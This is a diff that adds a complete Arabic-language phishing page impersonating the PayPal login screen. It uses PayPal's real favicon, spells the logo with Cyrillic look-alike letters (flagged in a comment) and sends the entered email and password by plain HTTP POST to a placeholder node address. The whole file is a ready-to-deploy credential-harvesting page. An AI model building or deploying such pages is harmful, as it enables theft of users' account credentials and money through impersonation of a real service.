@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>سجل الدخول إلى حسابك على PayPal</title>
+  <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/pp258.png" type="image/png">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f7fa;
+      margin: 0;
+      padding: 2rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .login-container {
+      background-color: #fff;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .logo {
+      text-align: center;
+      font-size: 2rem;
+      font-weight: bold;
+      color: #000;
+      margin-bottom: 1.5rem;
+    }
+
+    .form-group {
+      margin-bottom: 1rem;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 0.75rem;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 1rem;
+      direction: rtl;
+    }
+
+    input::placeholder {
+      color: #888;
+    }
+
+    .forgot-password {
+      display: block;
+      text-align: right;
+      margin-top: 0.5rem;
+      font-size: 0.9rem;
+      color: #0070ba;
+      text-decoration: none;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 0.75rem;
+      background-color: #0070ba;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 1rem;
+      cursor: pointer;
+      margin-top: 1rem;
+      transition: background-color 0.3s ease;
+    }
+
+    .login-btn:hover {
+      background-color: #005c99;
+    }
+
+    .divider {
+      text-align: center;
+      margin: 1.5rem 0;
+      position: relative;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      position: absolute;
+      top: 50%;
+      width: 40%;
+      height: 1px;
+      background-color: #ccc;
+    }
+
+    .divider::before {
+      right: 60%;
+    }
+
+    .divider::after {
+      left: 60%;
+    }
+
+    .divider span {
+      background-color: #fff;
+      padding: 0 1rem;
+      position: relative;
+      z-index: 1;
+    }
+
+    .create-btn {
+      width: 100%;
+      padding: 0.75rem;
+      background-color: white;
+      color: #0070ba;
+      border: 2px solid #0070ba;
+      border-radius: 4px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .create-btn:hover {
+      background-color: #e6f0fa;
+    }
+
+    @media (max-width: 480px) {
+      body {
+        padding: 1rem;
+      }
+
+      .login-container {
+        padding: 1.5rem;
+      }
+
+      .logo {
+        font-size: 1.5rem;
+      }
+
+      input[type="text"],
+      input[type="password"],
+      .login-btn,
+      .create-btn {
+        font-size: 0.95rem;
+        padding: 0.65rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">PаyPаl</div> <!-- Cyrillic "а" used -->
+
+    <form action="http://<Node-IP>:<Node-Port>/submit" method="POST">
+      <div class="form-group">
+        <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم المحمول" required>
+      </div>
+
+      <div class="form-group">
+        <input type="password" name="password" placeholder="كلمة المرور" required>
+        <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
+      </div>
+
+      <button type="submit" class="login-btn">تسجيل الدخول</button>
+    </form>
+
+    <div class="divider"><span>أو</span></div>
+
+    <button class="create-btn">تسجيل الاشتراك</button>
+  </div>
+</body>
+</html>
